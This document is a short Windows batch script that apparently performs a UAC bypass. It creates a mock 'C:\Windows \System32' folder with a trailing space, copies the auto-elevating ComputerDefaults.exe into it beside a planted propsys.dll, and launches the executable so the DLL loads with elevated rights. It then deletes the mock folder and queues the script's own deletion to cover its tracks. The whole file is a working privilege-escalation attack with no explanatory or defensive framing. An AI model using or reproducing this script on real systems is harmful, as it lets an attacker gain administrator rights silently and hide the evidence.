@echo off

mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
copy "C:\Windows\System32\ComputerDefaults.exe" "C:\Windows \System32\"
copy "propsys.dll" "C:\Windows \System32\"
del "propsys.dll"
"C:\Windows \System32\ComputerDefaults.exe"

@echo off
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32"
rmdir "C:\Windows \"

REM Queue the batch file for deletion
echo del "%~f0" > "%temp%\delete_self.bat"
echo exit >> "%temp%\delete_self.bat"
"%temp%\delete_self.bat"
